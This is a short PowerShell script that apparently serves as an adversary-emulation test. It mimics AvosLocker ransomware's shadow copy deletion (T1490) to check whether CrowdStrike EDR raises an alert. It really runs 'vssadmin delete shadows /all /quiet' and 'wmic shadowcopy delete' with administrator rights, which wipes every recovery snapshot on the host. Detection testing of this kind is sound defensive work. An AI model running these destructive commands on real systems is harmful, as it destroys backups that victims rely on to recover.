<#
.SYNOPSIS
    AvosLocker Shadow Copy Deletion - DETECTION TRIGGER
.DESCRIPTION
    Deletes Volume Shadow Copies using vssadmin.
    Will trigger EDR detection for T1490.
    REQUIRES ADMIN PRIVILEGES.
    TTP: T1490
#>
Write-Host "[*] Starting AvosLocker Shadow Copy Deletion (T1490)" -ForegroundColor Cyan
Write-Host "[*] This will trigger EDR detection for ransomware behavior" -ForegroundColor Yellow

try {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        Write-Host "[!] WARNING: Not running as Administrator" -ForegroundColor Red
    }
    
    # List current shadows first
    Write-Host "[*] Listing current shadow copies..."
    vssadmin list shadows 2>&1
    
    # ACTUAL DETECTION TRIGGER - Delete shadow copies
    Write-Host "`n[*] Executing: vssadmin delete shadows /all /quiet"
    $result = vssadmin delete shadows /all /quiet 2>&1
    Write-Host "[*] Result: $result"
    
    # Also try wmic method
    Write-Host "[*] Executing: wmic shadowcopy delete"
    $wmicResult = wmic shadowcopy delete 2>&1
    Write-Host "[*] WMIC Result: $wmicResult"
    
    Write-Host "[+] Shadow copy deletion commands executed" -ForegroundColor Green
    Write-Host "[!] CrowdStrike should detect: 'ShadowCopyDeleted' or 'RansomwareBehavior'" -ForegroundColor Magenta
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}

Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
